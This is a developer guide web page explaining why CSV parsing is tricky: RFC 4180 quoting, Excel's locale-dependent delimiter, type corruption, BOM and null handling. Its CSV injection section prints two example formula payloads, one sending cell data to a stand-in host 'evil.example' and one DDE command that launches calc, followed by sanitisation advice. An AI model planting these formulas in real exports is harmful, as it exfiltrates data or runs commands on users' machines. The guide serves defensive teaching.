@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="RFC 4180 quoting rules, why Excel opens comma files as one column in European locales, how spreadsheets corrupt leading zeros and gene names, BOM handling, and CSV formula injection." />
+  <title>Why CSV Is Not Really a Format - Layerbit Guides</title>
+  <link rel="canonical" href="https://layerbit.co.in/guides/csv-edge-cases.html" />
+  <meta name="robots" content="max-image-preview:large, max-snippet:-1, max-video-preview:-1" />
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="https://layerbit.co.in/guides/csv-edge-cases.html" />
+  <meta property="og:site_name" content="Layerbit" />
+  <meta property="og:title" content="Why CSV Is Not Really a Format - Layerbit Guides" />
+  <meta property="og:description" content="RFC 4180 quoting rules, why Excel opens comma files as one column in European locales, how spreadsheets corrupt leading zeros and gene names, BOM handling, and CSV formula injection." />
+  <meta property="og:image" content="https://layerbit.co.in/og-image.png" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="630" />
+  <meta property="og:image:alt" content="Layerbit - free browser-based developer tools" />
+  <meta property="og:locale" content="en" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Why CSV Is Not Really a Format - Layerbit Guides" />
+  <meta name="twitter:description" content="RFC 4180 quoting rules, why Excel opens comma files as one column in European locales, how spreadsheets corrupt leading zeros and gene names, BOM handling, and CSV formula injection." />
+  <meta name="twitter:image" content="https://layerbit.co.in/og-image.png" />
+  <meta name="twitter:image:alt" content="Layerbit - free browser-based developer tools" />
+  <meta name="theme-color" content="#0a0c10" />
+  <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "TechArticle",
+      "@id": "https://layerbit.co.in/guides/csv-edge-cases.html#article",
+      "headline": "Why CSV Is Not Really a Format",
+      "name": "Why CSV Is Not Really a Format",
+      "description": "RFC 4180 quoting rules, why Excel opens comma files as one column in European locales, how spreadsheets corrupt leading zeros and gene names, BOM handling, and CSV formula injection.",
+      "url": "https://layerbit.co.in/guides/csv-edge-cases.html",
+      "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://layerbit.co.in/guides/csv-edge-cases.html"
+      },
+      "datePublished": "2026-09-06",
+      "dateModified": "2026-09-21",
+      "inLanguage": "en",
+      "wordCount": 1800,
+      "keywords": "rfc 4180, csv parsing quoted commas, csv injection, excel csv delimiter locale, csv utf-8 bom, csv leading zeros excel",
+      "articleSection": "Data Formats",
+      "author": {
+        "@type": "Organization",
+        "name": "Layerbit Technologies",
+        "url": "https://layerbit.co.in/about.html"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "name": "Layerbit Technologies",
+        "url": "https://layerbit.co.in/",
+        "logo": {
+          "@type": "ImageObject",
+          "url": "https://layerbit.co.in/icon-512.png",
+          "width": 512,
+          "height": 512
+        }
+      },
+      "image": {
+        "@type": "ImageObject",
+        "url": "https://layerbit.co.in/icon-512.png",
+        "width": 512,
+        "height": 512
+      },
+      "isAccessibleForFree": true,
+      "proficiencyLevel": "Beginner"
+    },
+    {
+      "@type": "BreadcrumbList",
+      "@id": "https://layerbit.co.in/guides/csv-edge-cases.html#breadcrumb",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "Home",
+          "item": "https://layerbit.co.in/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "Guides",
+          "item": "https://layerbit.co.in/blog.html"
+        },
+        {
+          "@type": "ListItem",
+          "position": 3,
+          "name": "CSV edge cases",
+          "item": "https://layerbit.co.in/guides/csv-edge-cases.html"
+        }
+      ]
+    },
+    {
+      "@type": "FAQPage",
+      "@id": "https://layerbit.co.in/guides/csv-edge-cases.html#faq",
+      "mainEntity": [
+        {
+          "@type": "Question",
+          "name": "Why can I not just split a CSV file on commas?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "Because RFC 4180 allows a field to contain commas, double quotes and even line breaks as long as the field is wrapped in double quotes, with internal quotes escaped by doubling them. Splitting on commas breaks any such record, and splitting on newlines breaks records containing embedded line breaks. Correct parsing requires a small state machine, so use your language's CSV library rather than string splitting."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "Why does my CSV open as a single column in Excel?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "Excel uses the list separator from the operating system's regional settings rather than assuming a comma. In locales where the decimal mark is a comma, such as Germany, France and Spain, the list separator is a semicolon, so a comma-delimited file is not split. You can emit a sep=, line as the first row, which Excel honours, or ship an .xlsx file instead."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "Why does Excel strip the leading zeros from my CSV data?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "Excel runs type inference on every cell when opening a CSV. A value like 01234 is read as the number 1234 because a leading zero has no numeric meaning. Long digit strings also become scientific notation, and values resembling dates are converted. The corruption happens on open, not export, so the file on disk is correct until someone saves it."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "What is CSV injection?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "If an exported cell begins with =, +, - or @, spreadsheet applications treat it as a formula. An attacker who can store text in your database can plant a payload that executes when an administrator exports the data and opens it, potentially exfiltrating other cells. Mitigate it by prefixing any such value with an apostrophe or space before writing. Quoting the field alone is not sufficient."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "Can CSV distinguish an empty string from null?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "No. CSV has a single representation for absent data - nothing between two delimiters - so empty strings, nulls and missing values all collapse to the same thing. Parsers differ on whether they return an empty string or null. If the distinction matters you need an agreed sentinel value, or a format with a real type system such as JSON or Parquet."
+          }
+        }
+      ]
+    }
+  ]
+}
+  </script>
+
+  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6072772587431629" crossorigin="anonymous"></script>
+
+  <script src="https://unpkg.com/lucide@1.39.0" async></script>
+
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet" />
+  <link href="../layerbit-logo.png" rel="icon" type="image/x-icon" />
+  <link rel="manifest" href="../manifest.json" />
+  <link rel="apple-touch-icon" href="../apple-touch-icon.png" />
+  <link rel="stylesheet" href="../css/base.css" />
+  <link rel="stylesheet" href="../css/article.css" />
+
+  <style>
+
+    /* Long-form guide styling lives in css/article.css, linked from this page's head. */
+  
+  </style>
+</head>
+<body>
+  <header>
+    <a href="../" class="brand">
+      <svg width="36" height="36" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <polygon points="32,20 54,28 32,36 10,28" stroke="#f8fafc" stroke-width="4" stroke-linejoin="round"/>
+        <polyline points="10,38 32,46 54,38" stroke="#f8fafc" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/>
+        <polyline points="10,48 32,56 54,48" stroke="#f8fafc" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/>
+        <rect x="50" y="10" width="10" height="10" rx="2" fill="#00f2fe" />
+      </svg>
+      Layerbit
+    </a>
+  </header>
+
+  <nav class="crumbs" aria-label="Breadcrumb">
+    <a href="../">Home</a>
+    <span class="sep">/</span>
+    <a href="../blog.html">Guides</a>
+    <span class="sep">/</span>
+    <span aria-current="page">CSV edge cases</span>
+  </nav>
+
+  <article class="article">
+    <header class="article-head">
+      <span class="article-kicker">Data Formats</span>
+      <h1>Why CSV Is Not Really a Format</h1>
+      <p class="article-standfirst">Comma-separated values sounds like the simplest possible data interchange: split on commas, split on newlines, done. In reality CSV has no enforced standard, no type system, no declared encoding — and a spreadsheet at the other end that will rewrite your data without asking.</p>
+      <div class="article-meta">
+        <span class="byline">Layerbit Engineering</span>
+        <span><i data-lucide="calendar"></i>Published 6 September 2026</span>
+        <span><i data-lucide="clock"></i>9 min read</span>
+      </div>
+    </header>
+
+    <div class="takeaways">
+      <h2><i data-lucide="list-checks"></i> The short version</h2>
+      <ul>
+        <li>RFC 4180 is <em>informational</em>, not binding. Never split on <code>,</code> — a quoted field may legitimately contain commas, quotes and newlines.</li>
+        <li>Excel picks its delimiter from the operating system locale, so a comma file opens as one column across much of Europe.</li>
+        <li>Excel silently strips leading zeros, converts long digit strings to scientific notation, and reinterprets things that look like dates.</li>
+        <li>A field starting with <code>=</code>, <code>+</code>, <code>-</code> or <code>@</code> is a formula injection risk in any spreadsheet that opens your export.</li>
+      </ul>
+    </div>
+
+    <div class="prose">
+      <h2 id="rfc4180">There is a specification, and almost nobody obeys it</h2>
+      <p>RFC 4180 was published in 2005 to describe what CSV files generally look like. Its status is <em>Informational</em> — a description of existing practice rather than a standard anyone must implement. Its core rules are worth knowing because good parsers follow them:</p>
+      <ul>
+        <li>Fields are separated by commas; records by CRLF.</li>
+        <li>A field containing a comma, a double quote, or a line break <strong>must</strong> be enclosed in double quotes.</li>
+        <li>A double quote inside a quoted field is escaped by <strong>doubling it</strong>.</li>
+        <li>A header line is optional.</li>
+      </ul>
+      <p>That third rule is the one hand-rolled parsers get wrong. Consider a perfectly legal single record:</p>
+      <pre><code>id,name,quote,city
+7,"O'Brien, Jr.","He said ""no"" twice","Dubai
+UAE"</code></pre>
+      <p>Four fields. The second contains a comma, the third contains two escaped quotes, and the fourth contains a real newline in the middle of the record. Splitting on <code>,</code> gives six fragments; splitting the file on <code>\n</code> gives three "rows". Both results are wrong, and both are what a naive parser produces.</p>
+      <div class="callout warn">
+        <div class="callout-title"><i data-lucide="alert-triangle"></i> Never write your own CSV parser</div>
+        <p>Correct CSV parsing is a small state machine — in-quotes or not, was the last character a quote — not a string split. Every language has a battle-tested implementation: Python's <code>csv</code> module, Go's <code>encoding/csv</code>, Papa Parse in JavaScript. Use one. The bug you will otherwise ship is not "the parser breaks", it is "the parser silently shifts one customer's address into the phone column".</p>
+      </div>
+
+      <h2 id="delimiter">The comma is not always the delimiter</h2>
+      <p>This is the single most common cause of "your export is broken" support tickets. Microsoft Excel does not assume commas — it uses the <strong>list separator</strong> from the operating system's regional settings. In locales where the decimal mark is a comma (Germany, France, Spain, Italy, Brazil, and many more), the list separator is a <strong>semicolon</strong>.</p>
+      <p>So the same comma-delimited file, double-clicked:</p>
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>Locale</th><th>Expected separator</th><th>Result opening a comma file</th></tr></thead>
+          <tbody>
+            <tr><td>en-US, en-GB</td><td><code>,</code></td><td>Parses correctly</td></tr>
+            <tr><td>de-DE, fr-FR, es-ES</td><td><code>;</code></td><td>Everything lands in column A</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p>There are two practical mitigations. The blunt one is to emit a <code>sep=,</code> line as the very first line of the file — a Microsoft extension that Excel honours and that most other parsers will show as a stray row. The better one, for anything user-facing, is to offer an <code>.xlsx</code> export instead, because a real spreadsheet file carries its own structure and is immune to locale guessing entirely.</p>
+
+      <h2 id="excel">What Excel does to your data on open</h2>
+      <p>Opening a CSV in a spreadsheet is a type-inference pass over every cell, and it is lossy. None of the following are hypothetical:</p>
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>Your data</th><th>What appears</th><th>Why</th></tr></thead>
+          <tbody>
+            <tr><td><code>01234</code></td><td><code>1234</code></td><td>Read as a number; leading zero has no numeric meaning</td></tr>
+            <tr><td><code>4012888888881881</code></td><td><code>4.01289E+15</code></td><td>Over 15 significant digits, switched to scientific notation</td></tr>
+            <tr><td><code>1-5</code></td><td><code>05-Jan</code></td><td>Interpreted as a date</td></tr>
+            <tr><td><code>SEPT2</code></td><td><code>2-Sep</code></td><td>Also a date, famously</td></tr>
+            <tr><td><code>+971 4 123 4567</code></td><td><code>#NAME?</code> or a formula</td><td>Leading <code>+</code> starts an expression</td></tr>
+            <tr><td><code>3/4</code></td><td><code>04-Mar</code></td><td>Date again, not a fraction</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p>The gene-name case is the well-documented one: human gene symbols such as <em>SEPT2</em> and <em>MARCH1</em> were corrupted so routinely in published genomics datasets that in 2020 the HUGO Gene Nomenclature Committee renamed the affected genes rather than continue fighting the spreadsheet. That is the scale of the problem — a data format nudged an entire scientific field into renaming its subject matter.</p>
+      <p>Critically, this happens on <em>open</em>, not on export. Your file is correct; the tool reading it changes it, and if the user then saves, the corruption is now on disk. Prefixing values with a tab or an apostrophe, or wrapping in <code>="01234"</code>, are all common workarounds — each with its own downside when a non-Excel consumer reads the same file.</p>
+
+      <h2 id="encoding">Encoding is not declared anywhere</h2>
+      <p>A CSV file carries no metadata about its own character encoding. A parser must be told, or must guess. Two consequences:</p>
+      <p><strong>The BOM.</strong> When Excel saves as "CSV UTF-8" it prepends a byte-order mark: <code>EF BB BF</code>. A parser that does not strip it sees a first column named <code>﻿id</code> rather than <code>id</code>, so every lookup by header name fails on the first column only — a wonderfully confusing symptom. Read such files with encoding <code>utf-8-sig</code> in Python, or strip the BOM explicitly.</p>
+      <p><strong>Legacy single-byte encodings.</strong> Files exported from older Windows tooling are frequently Windows-1252, not UTF-8. Decoding those as UTF-8 either throws or produces mojibake — <code>café</code> becoming <code>cafÃ©</code>. There is no reliable in-band way to tell; you either agree the encoding with the producer or you sniff and hope.</p>
+
+      <div class="tool-cta">
+        <div class="cta-copy">
+          <h3>Convert CSV to JSON with the quoting rules respected</h3>
+          <p>Layerbit's CSV to JSON converter uses a proper lexical parser — quoted commas, doubled quotes and embedded newlines are handled correctly — and can convert back the other way, building a header row from the union of keys across all records. Runs entirely in your browser.</p>
+        </div>
+        <a class="cta-btn" href="../tools/csv-to-json.html"><i data-lucide="file-json-2"></i> Open CSV ↔ JSON</a>
+      </div>
+
+      <h2 id="injection">CSV injection: your export is executable</h2>
+      <p>This one is a genuine security issue and it is frequently missed, because the vulnerability is in your <em>output</em>, not your input.</p>
+      <p>If a cell's value begins with <code>=</code>, <code>+</code>, <code>-</code> or <code>@</code>, spreadsheet applications treat it as a formula. So an attacker who can get text into your database — a display name, a support-ticket subject, a form field — can plant a payload that executes when an administrator later exports the data and opens it:</p>
+      <pre><code>=HYPERLINK("https://evil.example/?d="&amp;A1,"Click for report")
+=cmd|' /c calc'!A1</code></pre>
+      <p>The first exfiltrates the neighbouring cell's contents to an attacker-controlled URL, disguised as a helpful link. The second is a legacy DDE payload that has historically achieved command execution. The victim is an internal user with a spreadsheet, and the attack path runs straight through your perfectly functioning export feature.</p>
+      <div class="callout">
+        <div class="callout-title"><i data-lucide="shield-check"></i> Sanitising an export</div>
+        <p>Before writing any user-supplied value, if it begins with <code>=</code>, <code>+</code>, <code>-</code>, <code>@</code>, tab or carriage return, prefix it with a single apostrophe (<code>'</code>) or a space. Quoting the field is <strong>not</strong> sufficient — the formula still evaluates once the quotes are consumed by the CSV parser. This is OWASP's recommended mitigation, and it costs one conditional per cell.</p>
+      </div>
+
+      <h2 id="nulls">Empty, null, and the difference CSV cannot express</h2>
+      <p>CSV has exactly one representation for "no value": nothing between two delimiters. It cannot distinguish an empty string from a null, a missing field, or a deliberate blank. So a round trip through CSV flattens all four into one:</p>
+      <pre><code>id,note
+1,
+2,""</code></pre>
+      <p>Most parsers give you <code>""</code> for both records. Some give <code>null</code> for the first. Neither is wrong, because the format never said. If the distinction matters to your domain — and for nullable database columns it usually does — CSV is the wrong transport, or you need an explicit sentinel value agreed with the other side (<code>\N</code>, as PostgreSQL's <code>COPY</code> uses, is a common choice).</p>
+
+      <h2 id="checklist">A CSV interchange checklist</h2>
+      <ol>
+        <li>Use a real parser and a real writer. No manual splitting, no manual quoting.</li>
+        <li>Agree the encoding explicitly, and write UTF-8. Handle the BOM when reading.</li>
+        <li>Sanitise leading <code>=</code>, <code>+</code>, <code>-</code>, <code>@</code> in every exported value.</li>
+        <li>Quote defensively on write — quoting a field that did not need it is always safe.</li>
+        <li>If humans will open it in Excel, ship <code>.xlsx</code> or accept that types will be reinterpreted.</li>
+        <li>Document your null convention, or avoid nullable fields in the export.</li>
+        <li>Prefer JSON, Parquet or a database for machine-to-machine transfer. CSV's only real advantage is that a human can open it.</li>
+      </ol>
+
+      <h2 id="closing">CSV's strength is also its weakness</h2>
+      <p>Every tool on earth can read CSV, which is precisely why it survives and precisely why it is unreliable: "every tool" means every tool's own opinion about delimiters, encodings and types. The format delegates all the hard questions to its readers, and they do not agree.</p>
+      <p>Treat a CSV file as what it is — a loosely structured text export whose types were thrown away at the boundary — and validate everything on the way back in. It is a perfectly good format for handing a table to a person. It is a poor contract between two systems.</p>
+
+      <div class="further">
+        <h2>Related guides and tools</h2>
+        <div class="further-grid">
+          <a class="further-card" href="../tools/csv-to-json.html">
+            <strong>CSV ↔ JSON Converter</strong>
+            <span>Standards-correct parsing with smart type inference.</span>
+          </a>
+          <a class="further-card" href="yaml-gotchas.html">
+            <strong>YAML's sharpest edges</strong>
+            <span>Another human-friendly format that guesses your types.</span>
+          </a>
+          <a class="further-card" href="../tools/json-to-table.html">
+            <strong>JSON Table Viewer</strong>
+            <span>Inspect converted records as a readable table.</span>
+          </a>
+        </div>
+      </div>
+    </div>
+  </article>
+
+  <a href="../" id="smartBackBtn" class="fab" aria-label="Command Center" title="Command Center">
+    <svg width="26" height="26" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="filter: drop-shadow(0 0 8px rgba(56, 189, 248, 0.5));">
+      <path d="M12 2L2 7l10 5 10-5-10-5z" stroke="#38bdf8" stroke-width="2" stroke-linejoin="round" fill="rgba(56,189,248,0.2)"/>
+      <path d="M2 17l10 5 10-5M2 12l10 5 10-5" stroke="#94a3b8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+    </svg>
+  </a>
+
+  <footer>
+    <div style="margin-bottom: 15px;">
+      &copy; 2025 - 2026 <strong>Layerbit Technologies</strong>. All rights reserved.
+    </div>
+    <div>
+      <a href="../about.html">About</a>
+      <a href="../privacy.html">Privacy Policy</a>
+      <a href="../terms.html">Terms of Service</a>
+      <a href="../blog.html">Developer Blog</a>
+      <a href="../contact.html">Contact</a>
+    </div>
+  </footer>
+
+  <script src="../js/shared.js"></script>
+  <script src="../main.js"></script>
+</body>
+</html>
